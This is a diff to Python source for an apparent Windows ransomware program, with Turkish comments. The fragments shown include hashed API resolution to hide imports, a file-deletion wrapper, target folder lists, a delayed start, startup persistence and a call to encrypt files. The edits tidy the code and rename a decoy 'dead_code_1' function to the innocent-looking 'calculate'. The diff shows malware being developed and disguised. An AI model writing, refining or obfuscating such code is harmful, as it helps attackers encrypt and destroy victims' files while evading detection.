@@ -1,5 +1,4 @@
-import  random, secrets, time, tkinter as tk, sys
-import ctypes
+import  random, secrets, time, tkinter as tk, sys, ctypes
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -14,13 +13,12 @@ shlwapi = ctypes.WinDLL('shlwapi', use_last_error=True)
 # os.path.join ve Path.home() olmadan dinamik yollar
 
 
-# pymmh3 - Pure Python MurmurHash3 (senin bulduğun kod)
+# pymmh3 - Pure Python MurmurHash3
 def xencode(x):
     if isinstance(x, bytes) or isinstance(x, bytearray):
         return x
     else:
         return x.encode()
-
 def hash(key, seed=0x0):
     key = bytearray(xencode(key))
     def fmix(h):
@@ -90,8 +88,6 @@ API_HASH_TABLE = {
 kernel32 = ctypes.windll.kernel32
 advapi32 = ctypes.windll.advapi32
 shell32 = ctypes.windll.shell32
-
-
 
 
 def resolve_api(dll, func_hash: int):
@@ -202,9 +198,6 @@ def dynamic_path_join(base: str, *parts: str) -> str:
 DeleteFileW = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.LPCWSTR)(
     resolve_api(kernel32, hash("DeleteFileW"))
 )
-
-
-
 
 def dynamic_delete_file(path: str):
     if not DeleteFileW(path):
@@ -331,14 +324,7 @@ folders_path = [
 ]
 
 
-
-
-
-
-
-
-
-def dead_code_1():
+def calculate():
     a = 1 + 2 * 3 / 4
     return a ** 2 if a else None
 
@@ -461,7 +447,7 @@ if __name__ == "__main__":
     time.sleep(random.randint(300, 1200))
     add_persistence_startup()
     encrypt_file()
-    dead_code_1()
+    calculate()
     #add_to_task_scheduler()
     root = tk.Tk()
     root.withdraw()
